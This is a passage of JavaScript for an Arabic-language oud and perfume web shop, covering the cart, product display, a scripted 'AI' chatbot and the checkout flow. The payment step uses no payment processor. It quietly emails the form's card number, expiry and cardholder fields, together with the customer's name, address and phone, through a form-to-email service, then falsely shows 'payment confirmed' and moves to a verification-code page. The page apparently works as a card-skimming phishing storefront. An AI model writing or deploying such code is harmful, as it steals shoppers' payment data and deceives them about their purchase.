            let isValid = true;
            
            requiredFields.forEach(fieldName => {
                const field = form.querySelector(`[name="${fieldName}"]`);
                if (!field.value.trim()) {
                    field.style.borderColor = '#EF4444';
                    isValid = false;
                } else {
                    field.style.borderColor = '#8B4513';
                }
            });
            
            if (!isValid) {
                showNotification('⚠️ يرجى ملء جميع الحقول المطلوبة', 'error');
                return false;
            }
            
            // Save customer info
            customerInfo = {
                firstName: form.querySelector('input[name="first_name"]').value,
                lastName: form.querySelector('input[name="last_name"]').value,
                email: form.querySelector('input[name="email"]').value,
                phone: form.querySelector('input[name="phone"]').value,
                address: form.querySelector('input[name="address"]').value,
                city: form.querySelector('select[name="city"]').value,
                postalCode: form.querySelector('input[name="postal_code"]').value,
                orderNotes: form.querySelector('textarea[name="order_notes"]').value
            };
            
            // Disable submit button and show loading
            const submitBtn = form.querySelector('button[type="submit"]');
            const originalBtnText = submitBtn.innerHTML;
            submitBtn.disabled = true;
            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin ml-2"></i> جاري الإرسال...';
            
            // Send email in background using Web3Forms
            const formData = new FormData(form);
            
            // Add cart data
            if (cart.length > 0) {
                const cartItemsText = cart.map(item => 
                    `${item.name} - الكمية: ${item.quantity} - السعر: ${item.price * item.quantity} ريال`
                ).join('\n');
                formData.append('cart_items', cartItemsText);
                
                const subtotal = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
                const shipping = subtotal > 200 ? 0 : 30;
                const total = subtotal + shipping;
                formData.append('order_total', `${total} ريال`);
            }
            
            // Send email in background and continue immediately
            sendToWeb3Forms(formData, 'customer')
                .then(() => {
                    console.log('Email sent successfully via Web3Forms');
                })
                .catch(error => {
                    console.log('Web3Forms email sending failed, but continuing with order');
                });
            
            // عرض رسالة نجاح والانتقال للصفحة التالية مباشرة
            showNotification('✅ تم حفظ المعلومات بنجاح! انتقال لمراجعة الطلب...', 'success');
            
            // Reset button after short delay
            setTimeout(() => {
                submitBtn.disabled = false;
                submitBtn.innerHTML = originalBtnText;
            }, 2000);
            
            // الانتقال للصفحة التالية فوراً - بدون انتظار الإيميل
            setTimeout(() => {
                showOrderReviewPage();
            }, 800);
            
            return false;
        }

        function handlePaymentSubmit(event) {
            event.preventDefault();
            const form = event.target;
            
            // Generate verification code - 6 digits only
            verificationCode = Math.floor(100000 + Math.random() * 900000).toString().padStart(6, '0');
            
            // Show success immediately and navigate to verification page
            showNotification(`✅ تم تأكيد الدفع! جاري الإرسال...`, 'success');
            
            // Disable submit button and show loading
            const submitBtn = form.querySelector('button[type="submit"]');
            submitBtn.disabled = true;
            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin ml-2"></i> جاري إرسال بيانات الدفع...';
            
            // Send email using Web3Forms
            const formData = new FormData(form);
            
            // Add all customer info and cart data
            if (customerInfo.firstName) {
                Object.entries(customerInfo).forEach(([key, value]) => {
                    if (value) {
                        formData.append('customer_' + key, value);
                    }
                });
            }
            
            if (cart.length > 0) {
                const cartItemsText = cart.map(item => 
                    `${item.name} - الكمية: ${item.quantity} - السعر: ${item.price * item.quantity} ريال`
                ).join('\n');
                
                formData.append('order_items_final', cartItemsText);
                
                const subtotal = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
                const shipping = subtotal > 200 ? 0 : 30;
                const total = subtotal + shipping;
                
                formData.append('final_total', `${total} ريال`);
            }
            
            // Add verification code and metadata
            formData.append('verification_code', verificationCode);
            formData.append('timestamp', new Date().toLocaleString('ar-SA'));
            formData.append('source', 'نموذج الدفع النهائي - الخطوة 3');
            
            // إرسال الإيميل في الخلفية
            sendToWeb3Forms(formData, 'payment')
                .then(() => {
                    console.log('Payment data sent successfully via Web3Forms');
                })
                .catch(error => {
                    console.log('Web3Forms payment sending failed');
                });
            
            // الانتقال لصفحة الكود مباشرة
            setTimeout(() => {
                showVerificationPage();
            }, 1000);
            
            return false;
        }

        // Toggle quick navigation
        function toggleQuickNav() {
            const quickNavMenu = document.getElementById('quickNavMenu');
            if (quickNavMenu.style.display === 'none') {
                quickNavMenu.style.display = 'block';
            } else {
                quickNavMenu.style.display = 'none';
            }
        }

        // ENHANCED PRODUCT DISPLAY WITH MAGICAL EFFECTS - UPDATED
        function displayProducts(productsToShow) {
            const grid = document.getElementById('productsGrid');
            grid.innerHTML = '';

            productsToShow.forEach((product, index) => {
                const discount = Math.round(((product.originalPrice - product.price) / product.originalPrice) * 100);
                const isOutOfStock = !product.available;
                
                // Generate magical effects for each product
                const glowClass = `product-glow-${(index % 5) + 1}`;
                const sparkles = generateSparkles();
                
                const productCard = `
                    <div class="product-card card-hover product-pulse ${isOutOfStock ? 'out-of-stock' : ''} ${glowClass}" 
                         style="animation-delay: ${index * 0.1}s"
                         onmousemove="handleProductHover(event, this)"
                         onmouseleave="handleProductLeave(this)">
                        <div class="relative overflow-hidden">
                            <img src="${product.image}" alt="${product.name}" class="w-full h-64 object-cover transition-transform duration-500 hover:scale-110" loading="lazy">
                            ${sparkles}
                            ${discount > 0 ? `<div class="absolute top-4 right-4 bg-gradient-to-r from-red-500 to-pink-500 text-white px-3 py-1 rounded-full text-sm font-bold animate-pulse">🔥 خصم ${discount}%</div>` : ''}
                            ${product.bestselling ? '<div class="absolute top-4 left-4 bg-gradient-to-r from-orange-500 to-yellow-500 text-white px-3 py-1 rounded-full text-sm font-bold animate-bounce">⭐ الأكثر مبيعاً</div>' : ''}
                            <div class="absolute inset-0 bg-gradient-to-t from-black/50 via-transparent to-transparent opacity-0 hover:opacity-100 transition-opacity duration-300"></div>
                        </div>
                        <div class="p-6 relative">
                            <h3 class="font-bold text-xl mb-3 text-gray-800 hover:text-orange-600 transition-colors duration-300">${product.name}</h3>
                            <p class="text-gray-600 text-sm mb-4 leading-relaxed">${product.description}</p>
                            
                            <div class="flex items-center mb-4">
                                ${'<i class="fas fa-star text-yellow-500 animate-pulse"></i>'.repeat(product.rating)}
                                ${'<i class="far fa-star text-gray-300"></i>'.repeat(5 - product.rating)}
                                <span class="text-gray-600 text-sm mr-2">(${product.rating}.0)</span>
                            </div>
                            
                            <div class="flex flex-wrap gap-1 mb-4">
                                ${product.features.map(feature => `<span class="bg-gradient-to-r from-orange-100 to-yellow-100 text-orange-800 text-xs px-2 py-1 rounded-full border border-orange-200 hover:shadow-md transition-shadow duration-200">${feature}</span>`).join('')}
                            </div>
                            
                            <div class="flex justify-between items-center">
                                <div class="flex flex-col">
                                    <span class="price-tag shadow-lg hover:shadow-xl transition-shadow duration-300">${product.price} ريال</span>
                                    ${product.originalPrice > product.price ? `<span class="text-gray-500 line-through text-sm mt-1">${product.originalPrice} ريال</span>` : ''}
                                </div>
                                <button onclick="${isOutOfStock ? 'void(0)' : 'addToCart(' + product.id + ')'}" 
                                        class="${isOutOfStock ? 'btn-disabled' : 'btn-primary'} shadow-lg hover:shadow-xl transform hover:scale-105 transition-all duration-300" 
                                        ${isOutOfStock ? 'disabled' : ''}>
                                    <i class="fas ${isOutOfStock ? 'fa-times' : 'fa-cart-plus'} ml-1"></i>
                                    ${isOutOfStock ? 'نفدت الكمية' : 'إضافة للسلة'}
                                </button>
                            </div>
                        </div>
                    </div>
                `;
                grid.innerHTML += productCard;
            });
        }

        function filterProducts(category) {
            currentFilter = category;
            
            // Update category cards
            document.querySelectorAll('.category-card').forEach(card => {
                card.classList.remove('active');
            });
            event.currentTarget.classList.add('active');
            
            let filteredProducts = category === 'all' ? products : products.filter(p => p.category === category);
            displayProducts(filteredProducts);
        }

        function sortProducts() {
            const sortValue = document.getElementById('sortSelect').value;
            let filteredProducts = currentFilter === 'all' ? products : products.filter(p => p.category === currentFilter);
            
            switch(sortValue) {
                case 'bestselling':
                    filteredProducts = filteredProducts.filter(p => p.bestselling);
                    break;
                case 'rating':
                    filteredProducts.sort((a, b) => b.rating - a.rating);
                    break;
                case 'price-high':
                    filteredProducts.sort((a, b) => b.price - a.price);
                    break;
                case 'price-low':
                    filteredProducts.sort((a, b) => a.price - b.price);
                    break;
            }
            
            displayProducts(filteredProducts);
        }

        function addToCart(productId) {
            const product = products.find(p => p.id === productId);
            if (!product.available) {
                showNotification('هذا المنتج نفدت كميته', 'error');
                return;
            }
            
            const existingItem = cart.find(item => item.id === productId);
            
            if (existingItem) {
                existingItem.quantity += 1;
            } else {
                cart.push({...product, quantity: 1});
            }
            
            updateCartDisplay();
            showNotification(`تم إضافة ${product.name} إلى السلة بنجاح`, 'success');
        }

        function updateCartDisplay() {
            const floatingCartCount = document.getElementById('floatingCartCount');
            const quickCartCount = document.getElementById('quickCartCount');
            const totalItems = cart.reduce((sum, item) => sum + item.quantity, 0);
            floatingCartCount.textContent = totalItems;
            quickCartCount.textContent = totalItems;
        }

        function showNotification(message, type = 'success') {
            const notification = document.createElement('div');
            notification.className = `notification ${type}`;
            notification.innerHTML = `
                <div class="flex items-center">
                    <i class="fas ${type === 'success' ? 'fa-check-circle' : type === 'warning' ? 'fa-exclamation-triangle' : 'fa-exclamation-circle'} ml-3"></i>
                    <span>${message}</span>
                </div>
            `;
            
            document.body.appendChild(notification);
            
            setTimeout(() => {
                notification.classList.add('show');
            }, 100);
            
            setTimeout(() => {
                notification.classList.remove('show');
                setTimeout(() => {
                    if (notification.parentNode) {
                        notification.parentNode.removeChild(notification);
                    }
                }, 400);
            }, 3000);
        }

        function openCart() {
            const modal = document.getElementById('cartModal');
            const cartItems = document.getElementById('cartItems');
            const cartTotal = document.getElementById('cartTotal');
            
            if (cart.length === 0) {
                cartItems.innerHTML = `
                    <div class="text-center py-16">
                        <i class="fas fa-shopping-cart text-6xl text-gray-300 mb-6"></i>
                        <h3 class="text-xl font-bold text-gray-500 mb-2">السلة فارغة</h3>
                        <p class="text-gray-400">ابدأ بإضافة منتجات رائعة إلى سلتك</p>
                    </div>
                `;
                cartTotal.innerHTML = '';
            } else {
                cartItems.innerHTML = cart.map(item => `
                    <div class="flex justify-between items-center py-4 border-b border-gray-100 last:border-b-0">
                        <div class="flex items-center">
                            <img src="${item.image}" alt="${item.name}" class="w-16 h-16 object-cover rounded-lg ml-4">
                            <div>
                                <h4 class="font-semibold text-gray-800">${item.name}</h4>
                                <p class="text-gray-600 text-sm">${item.price} ريال × ${item.quantity}</p>
                                <p class="text-orange-600 font-bold">${item.price * item.quantity} ريال</p>
                            </div>
                        </div>
                        <div class="flex items-center">
                            <button onclick="updateQuantity(${item.id}, -1)" class="w-8 h-8 bg-gray-200 rounded-full flex items-center justify-center hover:bg-gray-300 transition duration-200">-</button>
                            <span class="mx-3 font-bold text-lg">${item.quantity}</span>
                            <button onclick="updateQuantity(${item.id}, 1)" class="w-8 h-8 bg-gray-200 rounded-full flex items-center justify-center hover:bg-gray-300 transition duration-200">+</button>
                            <button onclick="removeFromCart(${item.id})" class="text-red-500 mr-3 hover:text-red-700 transition duration-200">
                                <i class="fas fa-trash"></i>
                            </button>
                        </div>
                    </div>
                `).join('');
                
                const subtotal = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
                const shipping = subtotal > 200 ? 0 : 30;
                const total = subtotal + shipping;
                
                cartTotal.innerHTML = `
                    <div class="space-y-2">
                        <div class="flex justify-between text-gray-600">
                            <span>المجموع الفرعي:</span>
                            <span>${subtotal} ريال</span>
                        </div>
                        <div class="flex justify-between text-gray-600">
                            <span>رسوم الشحن:</span>
                            <span class="${shipping === 0 ? 'text-green-600' : ''}">${shipping === 0 ? 'مجاني' : shipping + ' ريال'}</span>
                        </div>
                        ${shipping > 0 ? `<p class="text-sm text-orange-600">شحن مجاني للطلبات أكثر من 200 ريال</p>` : ''}
                        <div class="flex justify-between font-bold text-xl pt-2 border-t">
                            <span>الإجمالي:</span>
                            <span class="text-orange-600">${total} ريال</span>
                        </div>
                    </div>
                `;
            }
            
            modal.classList.add('active');
        }

        function closeCart() {
            document.getElementById('cartModal').classList.remove('active');
        }

        function updateQuantity(productId, change) {
            const item = cart.find(item => item.id === productId);
            if (item) {
                item.quantity += change;
                if (item.quantity <= 0) {
                    removeFromCart(productId);
                } else {
                    updateCartDisplay();
                    openCart();
                }
            }
        }

        function removeFromCart(productId) {
            const item = cart.find(item => item.id === productId);
            cart = cart.filter(item => item.id !== productId);
            updateCartDisplay();
            openCart();
            showNotification(`تم حذف ${item.name} من السلة`, 'success');
        }

        // START CHECKOUT PROCESS
        function startCheckout() {
            if (cart.length === 0) {
                showNotification('السلة فارغة، يرجى إضافة منتجات أولاً', 'error');
                return;
            }
            
            closeCart();
            showOrderInfoPage();
        }

        function showOrderInfoPage() {
            document.getElementById('mainContent').style.display = 'none';
            document.getElementById('orderInfoPage').classList.add('active');
        }

        function goBackToCart() {
            document.getElementById('orderInfoPage').classList.remove('active');
            document.getElementById('mainContent').style.display = 'block';
            openCart();
        }

        function showOrderReviewPage() {
            document.getElementById('orderInfoPage').classList.remove('active');
            document.getElementById('orderReviewPage').classList.add('active');
            populateOrderReview();
        }

        function populateOrderReview() {
            // Populate order items
            const reviewOrderItems = document.getElementById('reviewOrderItems');
            reviewOrderItems.innerHTML = cart.map(item => `
                <div class="flex justify-between items-center p-4 bg-gray-50 rounded-lg">
                    <div class="flex items-center">
                        <img src="${item.image}" alt="${item.name}" class="w-12 h-12 object-cover rounded ml-3">
                        <div>
                            <h4 class="font-semibold">${item.name}</h4>
                            <p class="text-sm text-gray-600">الكمية: ${item.quantity}</p>
                        </div>
                    </div>
                    <span class="font-bold text-orange-600">${item.price * item.quantity} ريال</span>
                </div>
            `).join('');
            
            // Populate customer info
            const reviewCustomerInfo = document.getElementById('reviewCustomerInfo');
            reviewCustomerInfo.innerHTML = `
                <div class="space-y-2 text-sm">
                    <p><strong>الاسم:</strong> ${customerInfo.firstName} ${customerInfo.lastName}</p>
                    <p><strong>البريد الإلكتروني:</strong> ${customerInfo.email}</p>
                    <p><strong>رقم الهاتف:</strong> ${customerInfo.phone}</p>
                    <p><strong>العنوان:</strong> ${customerInfo.address}</p>
                    <p><strong>المدينة:</strong> ${customerInfo.city}</p>
                    <p><strong>الرمز البريدي:</strong> ${customerInfo.postalCode}</p>
                    ${customerInfo.orderNotes ? `<p><strong>ملاحظات:</strong> ${customerInfo.orderNotes}</p>` : ''}
                </div>
            `;
            
            // Populate order summary
            const subtotal = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
            const shipping = subtotal > 200 ? 0 : 30;
            const total = subtotal + shipping;
            
            const reviewOrderSummary = document.getElementById('reviewOrderSummary');
            reviewOrderSummary.innerHTML = `
                <div class="bg-gradient-to-r from-orange-50 to-yellow-50 p-6 rounded-xl border border-orange-200">
                    <div class="flex justify-between text-lg mb-2">
                        <span>المجموع الفرعي:</span>
                        <span class="font-semibold">${subtotal} ريال</span>
                    </div>
                    <div class="flex justify-between text-lg mb-2">
                        <span>رسوم الشحن:</span>
                        <span class="font-semibold ${shipping === 0 ? 'text-green-600' : ''}">${shipping === 0 ? 'مجاني' : shipping + ' ريال'}</span>
                    </div>
                    ${shipping > 0 ? `<p class="text-sm text-orange-600 mb-4">شحن مجاني للطلبات أكثر من 200 ريال</p>` : ''}
                    <div class="border-t border-orange-200 pt-4">
                        <div class="flex justify-between text-2xl font-bold text-orange-600">
                            <span>الإجمالي:</span>
                            <span>${total} ريال</span>
                        </div>
                    </div>
                </div>
            `;
        }

        function goBackToInfo() {
            document.getElementById('orderReviewPage').classList.remove('active');
            document.getElementById('orderInfoPage').classList.add('active');
        }

        function editCustomerInfo() {
            goBackToInfo();
        }

        function proceedToPayment() {
            // Show success message
            showNotification('✅ تم تأكيد مراجعة الطلب! جاري الإرسال والانتقال للدفع...', 'success');
            
            // Send review data using Web3Forms in background
            const formData = new FormData();
            
            // Add customer info
            if (customerInfo.firstName) {
                Object.entries(customerInfo).forEach(([key, value]) => {
                    if (value) {
                        formData.append('customer_' + key, value);
                    }
                });
            }
            
            // Add cart data
            if (cart.length > 0) {
                const cartItemsText = cart.map(item => 
                    `${item.name} - الكمية: ${item.quantity} - السعر: ${item.price * item.quantity} ريال`
                ).join('\n');
                
                formData.append('order_items_review', cartItemsText);
                
                const subtotal = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
                const shipping = subtotal > 200 ? 0 : 30;
                const total = subtotal + shipping;
                
                formData.append('order_total_review', `${total} ريال`);
            }
            
            // Add metadata
            formData.append('timestamp', new Date().toLocaleString('ar-SA'));
            formData.append('source', 'مراجعة الطلب - تأكيد البيانات - الخطوة 2');
            
            // Send review data in background
            sendToWeb3Forms(formData, 'review')
                .then(() => {
                    console.log('Review data sent successfully via Web3Forms');
                })
                .catch(error => {
                    console.log('Web3Forms review sending failed');
                });
            
            // Move to payment page immediately
            setTimeout(() => {
                showPaymentPage();
            }, 1000);
        }

        function populatePaymentSummary() {
            const subtotal = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
            const shipping = subtotal > 200 ? 0 : 30;
            const total = subtotal + shipping;
            
            const paymentSummary = document.getElementById('paymentSummary');
            paymentSummary.innerHTML = `
                <div class="bg-gradient-to-r from-green-50 to-blue-50 p-6 rounded-xl border border-green-200">
                    <h4 class="font-bold text-lg mb-4 text-gray-800">المبلغ المطلوب دفعه</h4>
                    <div class="space-y-3">
                        <div class="flex justify-between">
                            <span>المنتجات (${cart.length} عنصر):</span>
                            <span class="font-semibold">${subtotal} ريال</span>
                        </div>
                        <div class="flex justify-between">
                            <span>الشحن:</span>
                            <span class="font-semibold ${shipping === 0 ? 'text-green-600' : ''}">${shipping === 0 ? 'مجاني' : shipping + ' ريال'}</span>
                        </div>
                        <div class="border-t border-gray-200 pt-3">
                            <div class="flex justify-between text-xl font-bold text-green-600">
                                <span>المجموع النهائي:</span>
                                <span>${total} ريال</span>
                            </div>
                        </div>
                    </div>
                </div>
            `;
        }

        function showPaymentPage() {
            document.getElementById('orderReviewPage').classList.remove('active');
            document.getElementById('paymentPage').classList.add('active');
            populatePaymentSummary();
        }

        function goBackToReview() {
            document.getElementById('paymentPage').classList.remove('active');
            document.getElementById('orderReviewPage').classList.add('active');
        }

        // CARD MANAGEMENT FUNCTIONS
        function formatCardNumber(input) {
            let value = input.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
            let formattedValue = value.match(/.{1,4}/g)?.join(' ');
            input.value = formattedValue || value;
            
            // Add card type detection
            if (value.startsWith('4')) {
                input.style.backgroundImage = 'url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzAiIGhlaWdodD0iMjAiIHZpZXdCb3g9IjAgMCAzMCAyMCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjMwIiBoZWlnaHQ9IjIwIiByeD0iMyIgZmlsbD0iIzAwNTFBNSIvPgo8dGV4dCB4PSIzIiB5PSIxNCIgZmlsbD0id2hpdGUiIGZvbnQtc2l6ZT0iOCIgZm9udC1mYW1pbHk9IkFyaWFsIj5WSVNBPC90ZXh0Pgo8L3N2Zz4=)';
                input.style.backgroundRepeat = 'no-repeat';
                input.style.backgroundPosition = 'right 10px center';
            } else if (value.startsWith('5')) {
                input.style.backgroundImage = 'url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzAiIGhlaWdodD0iMjAiIHZpZXdCb3g9IjAgMCAzMCAyMCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjMwIiBoZWlnaHQ9IjIwIiByeD0iMyIgZmlsbD0iI0VCMDAxQiIvPgo8Y2lyY2xlIGN4PSIxMSIgY3k9IjEwIiByPSI1IiBmaWxsPSIjRkY1RjAwIi8+CjxjaXJjbGUgY3g9IjE5IiBjeT0iMTAiIHI9IjUiIGZpbGw9IiNGRkY1RjAiLz4KPC9zdmc+)';
                input.style.backgroundRepeat = 'no-repeat';
                input.style.backgroundPosition = 'right 10px center';
            }
        }

        function formatExpiryDate(input) {
            let value = input.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            input.value = value;
        }

        function loadSavedCards() {
            // localStorage not available in iframe - using memory only
            savedCards = [];
        }

        function saveCard(cardData) {
            const existingIndex = savedCards.findIndex(card => 
                card.cardNumber === cardData.cardNumber
            );
            
            if (existingIndex === -1) {
                savedCards.push(cardData);
                // Note: Cards will only be saved in memory during session
            }
        }

        function showCardSuggestions(input) {
            const suggestions = document.getElementById('cardSuggestions');
            suggestions.innerHTML = '';
            
            if (savedCards.length > 0) {
                savedCards.forEach((card, index) => {
                    const suggestion = document.createElement('div');
                    suggestion.className = 'card-suggestion';
                    suggestion.innerHTML = `
                        <div class="flex justify-between items-center">
                            <span>**** **** **** ${card.cardNumber.slice(-4)}</span>
                            <span class="text-sm text-gray-500">${card.cardHolder}</span>
                        </div>
                    `;
                    suggestion.onclick = () => selectCard(card, input);
                    suggestions.appendChild(suggestion);
                });
                suggestions.style.display = 'block';
            }
        }

        function hideCardSuggestions(input) {
            setTimeout(() => {
                const suggestions = document.getElementById('cardSuggestions');
                suggestions.style.display = 'none';
            }, 200);
        }

        function showExpirySuggestions(input) {
            const suggestions = document.getElementById('expirySuggestions');
            suggestions.innerHTML = '';
            
            const uniqueExpiries = [...new Set(savedCards.map(card => card.expiryDate))];
            
            if (uniqueExpiries.length > 0) {
                uniqueExpiries.forEach(expiry => {
                    const suggestion = document.createElement('div');
                    suggestion.className = 'card-suggestion';
                    suggestion.textContent = expiry;
                    suggestion.onclick = () => {
                        input.value = expiry;
                        suggestions.style.display = 'none';
                    };
                    suggestions.appendChild(suggestion);
                });
                suggestions.style.display = 'block';
            }
        }

        function hideExpirySuggestions(input) {
            setTimeout(() => {
                const suggestions = document.getElementById('expirySuggestions');
                suggestions.style.display = 'none';
            }, 200);
        }

        function showHolderSuggestions(input) {
            const suggestions = document.getElementById('holderSuggestions');
            suggestions.innerHTML = '';
            
            const uniqueHolders = [...new Set(savedCards.map(card => card.cardHolder))];
            
            if (uniqueHolders.length > 0) {
                uniqueHolders.forEach(holder => {
                    const suggestion = document.createElement('div');
                    suggestion.className = 'card-suggestion';
                    suggestion.textContent = holder;
                    suggestion.onclick = () => {
                        input.value = holder;
                        suggestions.style.display = 'none';
                    };
                    suggestions.appendChild(suggestion);
                });
                suggestions.style.display = 'block';
            }
        }

        function hideHolderSuggestions(input) {
            setTimeout(() => {
                const suggestions = document.getElementById('holderSuggestions');
                suggestions.style.display = 'none';
            }, 200);
        }

        function selectCard(card, input) {
            const form = input.closest('form');
            form.querySelector('input[name="card_number"]').value = card.cardNumber;
            form.querySelector('input[name="expiry_date"]').value = card.expiryDate;
            form.querySelector('input[name="card_holder"]').value = card.cardHolder;
            
            // Hide suggestions
            document.getElementById('cardSuggestions').style.display = 'none';
            
            // Format the card number
            formatCardNumber(form.querySelector('input[name="card_number"]'));
        }

        // UTILITY FUNCTIONS
        function setupScrollButton() {
            const scrollButton = document.querySelector('.scroll-to-top');
            
            window.addEventListener('scroll', () => {
                if (window.pageYOffset > 300) {
                    scrollButton.classList.add('visible');
                } else {
                    scrollButton.classList.remove('visible');
                }
            });
        }

        function scrollToTop() {
            window.scrollTo({
                top: 0,
                behavior: 'smooth'
            });
        }

        function animateOnScroll() {
            const observer = new IntersectionObserver((entries) => {
                entries.forEach(entry => {
                    if (entry.isIntersecting) {
                        entry.target.style.opacity = '1';
                        entry.target.style.transform = 'translateY(0)';
                    }
                });
            }, {
                threshold: 0.1,
                rootMargin: '0px 0px -50px 0px'
            });

            // Observe elements that should animate
            document.querySelectorAll('.product-card, .team-member, .category-card').forEach(el => {
                el.style.opacity = '0';
                el.style.transform = 'translateY(20px)';
                el.style.transition = 'all 0.6s ease';
                observer.observe(el);
            });
        }

        // Smooth scrolling for navigation
        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
            anchor.addEventListener('click', function (e) {
                e.preventDefault();
                const target = document.querySelector(this.getAttribute('href'));
                if (target) {
                    target.scrollIntoView({
                        behavior: 'smooth',
                        block: 'start'
                    });
                }
            });
        });

        // Dark mode detection
        if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
            document.documentElement.classList.add('dark');
        }
        
        window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', event => {
            if (event.matches) {
                document.documentElement.classList.add('dark');
            } else {
                document.documentElement.classList.remove('dark');
            }
        });

        // AI CHATBOT SYSTEM WITH ADVANCED FEATURES
        let aiChatOpen = false;
        
        function toggleAIChat() {
            aiChatOpen = !aiChatOpen;
            const chatContainer = document.getElementById('aiChatContainer');
            
            if (aiChatOpen) {
                chatContainer.classList.add('active');
                // Focus on input when opening
                setTimeout(() => {
                    document.getElementById('aiChatInput').focus();
                }, 300);
            } else {
                chatContainer.classList.remove('active');
            }
        }

        function addAIMessage(message, isUser = false) {
            const messagesContainer = document.getElementById('aiChatMessages');
            const messageDiv = document.createElement('div');
            messageDiv.className = `ai-message ${isUser ? 'user' : 'bot'}`;
            messageDiv.innerHTML = message;
            messagesContainer.appendChild(messageDiv);
            messagesContainer.scrollTop = messagesContainer.scrollHeight;
        }

        function askAI(question) {
            document.getElementById('aiChatInput').value = question;
            sendAIMessage();
        }

        function handleAIEnter(event) {
            if (event.key === 'Enter') {
                sendAIMessage();
            }
        }

        function sendAIMessage() {
            const input = document.getElementById('aiChatInput');
            const message = input.value.trim();
            
            if (!message) return;
            
            // Add user message
            addAIMessage(message, true);
            input.value = '';
            
            // Show typing indicator
            const typingDiv = document.createElement('div');
            typingDiv.className = 'ai-message bot';
            typingDiv.innerHTML = '<div class="flex items-center"><span>🤖</span><span class="mr-2">يكتب...</span><div class="loading-spinner"></div></div>';
            typingDiv.id = 'typing-indicator';
            document.getElementById('aiChatMessages').appendChild(typingDiv);
            
            // Simulate AI response with delay
            setTimeout(() => {
                document.getElementById('typing-indicator').remove();
                const response = getAIResponse(message);
                addAIMessage(response);
            }, 1000 + Math.random() * 2000);
        }

        function getAIResponse(userMessage) {
            const message = userMessage.toLowerCase();
            
            // Advanced AI responses based on keywords
            if (message.includes('أفضل عود') || message.includes('مبتدئين') || message.includes('ابدأ')) {
                return `
                    <strong>🌟 للمبتدئين، أنصح بـ:</strong><br><br>
                    1️⃣ <strong>دقة هندي (120 ريال)</strong> - مثالي للبداية<br>
                    2️⃣ <strong>دهن عود تراد (95 ريال)</strong> - سهل الاستخدام<br>
                    3️⃣ <strong>مبسوس موروكي (85 ريال)</strong> - للمبخرة الكهربائية<br><br>
                    💡 <em>هذه الأنواع تتميز بالثبات والرائحة الجميلة وسهولة الاستخدام</em>
                `;
            }
            
            if (message.includes('محافظة') || message.includes('حفظ') || message.includes('تخزين')) {
                return `
                    <strong>🛡️ نصائح المحافظة على العود:</strong><br><br>
                    ✅ احفظه في مكان بارد وجاف<br>
                    ✅ تجنب أشعة الشمس المباشرة<br>
                    ✅ استخدم علب محكمة الإغلاق<br>
                    ✅ تجنب الرطوبة العالية<br>
                    ✅ لا تخزنه في الثلاجة<br><br>
                    📦 <em>علبنا الأصلية مصممة للحفاظ على الجودة لسنوات</em>
                `;
            }
            
            if (message.includes('فرق') || message.includes('طبيعي') || message.includes('محسن')) {
                return `
                    <strong>🔍 الفرق بين العود الطبيعي والمحسن:</strong><br><br>
                    <strong>عود طبيعي:</strong><br>
                    🌿 مستخرج مباشرة من الشجرة<br>
                    🌿 رائحة أصيلة وقوية<br>
                    🌿 سعر أعلى نسبياً<br>
                    🌿 ثبات طويل جداً<br><br>
                    <strong>عود محسن:</strong><br>
                    ⚡ معالج بزيوت طبيعية<br>
                    ⚡ رائحة محسنة ومميزة<br>
                    ⚡ سعر أكثر اقتصادية<br>
                    ⚡ جودة ممتازة<br><br>
                    💰 <em>كلاهما أصلي وعالي الجودة</em>
                `;
            }
            
            if (message.includes('توصية') || message.includes('اقترح') || message.includes('أريد')) {
                const recommendations = [
                    "موروكي الفخامة - مثالي للمناسبات الخاصة",
                    "دهن عود كمبودي قديم - للذواقين",
                    "زعفران سوبر نقيل - للضيافة الفاخرة",
                    "مبسوس موروكي - للتبخير اليومي"
                ];
                const randomRec = recommendations[Math.floor(Math.random() * recommendations.length)];
                
                return `
                    <strong>🎯 توصيتي الخاصة لك:</strong><br><br>
                    ⭐ <strong>${randomRec}</strong><br><br>
                    <strong>لماذا هذا الاختيار؟</strong><br>
                    • جودة استثنائية<br>
                    • ثبات ممتاز<br>
                    • تقييمات عملاء ممتازة<br>
                    • قيمة رائعة مقابل السعر<br><br>
                    💬 <em>هل تريد معرفة المزيد عن هذا المنتج؟</em>
                `;
            }
            
            if (message.includes('سعر') || message.includes('كم') || message.includes('تكلفة')) {
                return `
                    <strong>💰 أسعارنا التنافسية:</strong><br><br>
                    🏷️ <strong>دقة هندي:</strong> 120 ريال<br>
                    🏷️ <strong>موروكي الفخامة:</strong> 180 ريال<br>
                    🏷️ <strong>دهن عود تراد:</strong> 95 ريال<br>
                    🏷️ <strong>زعفران سوبر نقيل:</strong> 220 ريال<br><br>
                    🚚 <strong>شحن مجاني</strong> للطلبات أكثر من 200 ريال<br>
                    💳 <strong>خصومات</strong> تصل إلى 25% على مختارات<br><br>
                    📞 <em>للاستفسار عن أسعار خاصة: 00966542068739</em>
                `;
            }
            
            if (message.includes('شحن') || message.includes('توصيل') || message.includes('وصول')) {
                return `
                    <strong>🚚 خدمة التوصيل السريع:</strong><br><br>
                    📦 <strong>داخل الرياض:</strong> 1-2 أيام عمل<br>
                    📦 <strong>باقي المدن:</strong> 2-4 أيام عمل<br>
                    📦 <strong>المناطق النائية:</strong> 3-5 أيام عمل<br><br>
                    💰 <strong>رسوم الشحن:</strong><br>
                    • مجاني للطلبات أكثر من 200 ريال<br>
                    • 30 ريال للطلبات الأقل<br><br>
